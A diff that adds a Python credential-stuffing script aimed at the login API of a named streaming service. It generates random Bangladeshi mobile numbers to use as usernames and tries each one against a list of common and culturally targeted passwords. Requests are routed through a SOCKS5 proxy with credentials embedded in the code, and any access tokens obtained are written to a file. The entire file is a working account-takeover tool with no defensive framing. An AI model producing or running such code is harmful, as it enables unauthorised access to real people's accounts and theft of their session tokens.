@@ -1,0 +1,111 @@
+import requests
+import random
+
+# API URL
+url = "https://web.aynaott.com/api/authorization/login"
+
+# SOCKS5 Proxy Settings
+proxy = "bdix.bypassempire.com:1080"
+proxy_user = "@bdiix_bypass"
+proxy_pass = "@bdiix_bypass"
+proxy_auth = f"{proxy_user}:{proxy_pass}"
+
+proxies = {
+    "http": f"socks5h://{proxy_auth}@{proxy}",
+    "https": f"socks5h://{proxy_auth}@{proxy}"
+}
+
+# Common passwords to try
+passwords = [
+    # Numeric
+    "1234", "12345", "123456", "1234567", "12345678", "123456789",
+    "000000", "111111", "222222", "112233", "987654", "123123", "123321", "321321", "121212", "147258",
+    "100200", "786786", "786123", "969696",
+
+    # Name-based
+    "bangladesh", "dhaka123", "rafi123", "hasan786", "sadia123", "mehedi123", "nipu123", "babu123", "akash123", "mahmud123",
+    "sumi123", "rakib786", "sabbir123", "nirob123", "mama123", "apu123", "meem123", "raihan786", "sajid123", "karim2020",
+
+    # Love/Relationship based
+    "loveyou", "iloveyou", "iloveyou123", "tumiamar", "ami_tomay_valobashi",
+    "mylove123", "jaan123", "mon123", "onlyyou", "missyou", "couple2025", "loveu123",
+
+    # Religion & Culture based
+    "allah123", "islam786", "muslim123", "muslim786", "muhammad", "quran786",
+    "bismillah", "alhamdulillah", "laillah",
+
+    # Common English
+    "password", "password123", "admin", "admin123", "admin@123",
+    "abc123", "abc12345", "pass123", "passw0rd", "qwerty", "qwerty123", "letmein", "welcome", "login123", "test123",
+
+    # Game-related
+    "freefire123", "pubglover", "gamingbd", "bdplayer",
+
+    # Bangladesh specific
+    "bangla"
+]
+
+# Random phone number generator (11-digit, Bangladeshi mobile prefixes)
+def generate_login():
+    prefixes = ["017", "013", "015", "016", "018", "019"]
+    prefix = random.choice(prefixes)
+    number = "".join(str(random.randint(0, 9)) for _ in range(8))
+    return prefix + number
+
+# Try login with given credentials
+def try_login(login, password):
+    data = {
+        "login": login,
+        "password": password,
+        "device_id": "8858CA887410EC22",
+        "os": "android",
+        "platform": "mobile"
+    }
+    try:
+        response = requests.post(url, json=data, proxies=proxies, timeout=10)
+        if response.status_code == 200:
+            result = response.json()
+            if "token" in result.get("content", {}):
+                return True, result["content"]["token"]["access_token"]
+            else:
+                return False, result.get("message", "No token in response")
+        else:
+            return False, f"HTTP {response.status_code}"
+    except Exception as e:
+        return False, str(e)
+
+# Main process
+def main():
+    max_attempts = 1  # how many logins to try
+    count = 0
+
+    while count < max_attempts:
+        login = generate_login()
+        count += 1
+
+        # Try with login == password
+        success, token = try_login(login, login)
+        with open("try.txt", "a") as f_try:
+            f_try.write(f"Trying login={login}, password={login} => {'Success' if success else 'Failed'}\n")
+
+        if success:
+            with open("save.txt", "a") as f_save:
+                f_save.write(f"{login} {login} {token}\n")
+            print(f"Success: {login} {login}")
+            continue
+
+        # Try all common passwords
+        for pwd in passwords:
+            success, token = try_login(login, pwd)
+            with open("try.txt", "a") as f_try:
+                f_try.write(f"Trying login={login}, password={pwd} => {'Success' if success else 'Failed'}\n")
+            if success:
+                with open("save.txt", "a") as f_save:
+                    f_save.write(f"{login} {pwd} {token}\n")
+                print(f"Success: {login} {pwd}")
+                break
+
+        print(f"[{count}/{max_attempts}] Done login: {login}")
+
+if __name__ == "__main__":
+    main()
